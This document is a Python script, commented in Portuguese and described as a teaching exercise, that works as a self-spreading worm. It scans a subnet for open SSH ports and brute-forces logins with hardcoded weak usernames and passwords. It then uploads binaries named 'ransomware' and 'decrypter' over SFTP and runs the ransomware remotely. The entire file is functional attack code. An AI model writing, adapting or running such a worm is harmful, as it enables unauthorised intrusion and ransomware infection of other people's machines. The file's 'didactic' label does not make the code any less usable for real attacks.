import socket
import paramiko
import os
import sys
import logging

# Configurações do ambiente didático
USUARIOS_ALVO = ["aluno", "admin", "root"]
SENHAS_ALVO = ["senha123", "password", "admin123"]
PORTA_SSH = 22

# Configuração do Logging (caso seja executado separadamente)
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - [%(levelname)s] - %(message)s'
)

def get_resource(relative_path):
    """Obtém o caminho para o recurso, compatível com PyInstaller."""
    if hasattr(sys, '_MEIPASS'):
        return os.path.join(sys._MEIPASS, relative_path)
    return os.path.join(os.path.abspath("."), relative_path)

def scan_rede(prefixo_rede="100.79.121."):
    """Varre a rede em busca da porta 22 aberta."""
    logging.info(f"Iniciando varredura na rede: {prefixo_rede}0/24")
    alvos = []
    for i in range(1, 255):
        ip = f"{prefixo_rede}{i}"
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(0.1)
            if s.connect_ex((ip, PORTA_SSH)) == 0:
                logging.info(f"Host com porta {PORTA_SSH} aberta encontrado: {ip}")
                alvos.append(ip)
    logging.info(f"Varredura concluída. {len(alvos)} host(s) alvo encontrado(s).")
    return alvos

def infectar_host(ip, usuario, senha):
    """Envia o binário, descompacta dependências e executa."""
    logging.info(f"Tentando acesso SSH em {ip} com usuário '{usuario}'...")
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    try:
        client.connect(ip, port=PORTA_SSH, username=usuario, password=senha, timeout=5)
        logging.info(f"Conexão SSH bem-sucedida em {ip}! Transferindo payload...")

        sftp = client.open_sftp()
        # 1. Envia o executável compilado (nomeado como 'ransomware')
        sftp.put(("ransomware"), "ransomware")
        sftp.put(("decrypter"), "decrypter")
        sftp.close()

        # 2. Comandos remotos:
        cmd_chmod = "chmod +x ransomware"
        cmd_run = "./ransomware"
        
        logging.info(f"Iniciando execução remota do payload em {ip}...")
        client.exec_command(f"{cmd_chmod} && {cmd_run}")
        client.close()
        logging.info(f"Payload disparado com sucesso em {ip}.")
        return True
    except Exception as e:
        logging.error(f"Falha de autenticação ou conexão em {ip} ({usuario}): {e}")
        return False

def iniciar_worm():
    logging.info("=== Módulo Worm de Propagação Iniciado ===")
    hosts = scan_rede()
    if not hosts:
        logging.info("Nenhum alvo viável encontrado. Encerrando propagação.")
        return
        
    for host in hosts:
        for user in USUARIOS_ALVO:
            sucesso = False
            for pwd in SENHAS_ALVO:
                if infectar_host(host, user, pwd):
                    logging.info(f"Host {host} comprometido com sucesso. Movendo para o próximo alvo.")
                    sucesso = True
                    break
            if sucesso: break
    logging.info("=== Módulo Worm Finalizado ===")

if __name__ == "__main__":
    iniciar_worm()